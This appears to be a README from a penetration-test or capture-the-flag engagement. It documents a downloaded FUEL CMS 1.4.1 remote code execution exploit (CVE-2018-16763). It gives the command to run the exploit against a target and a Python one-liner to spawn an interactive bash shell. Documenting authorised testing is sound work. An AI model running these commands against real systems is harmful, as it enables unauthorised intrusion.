# Scripts

This folder contains any custom or downloaded scripts used during the engagement.

## fuel_cms_rce.py 

**Source:** Exploit-DB (php/webapps/50477.py)  
**CVE:** CVE-2018-16763  
**Usage:**

```bash
python3 fuel_cms_rce.py -u http://target-ip
```

To get Spawn a proper interactive shell:
**Usage:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Description:**
Remote Code Execution exploit for FUEL CMS 1.4.1. Exploits improper input validation in the `/pages/select` filter parameter.


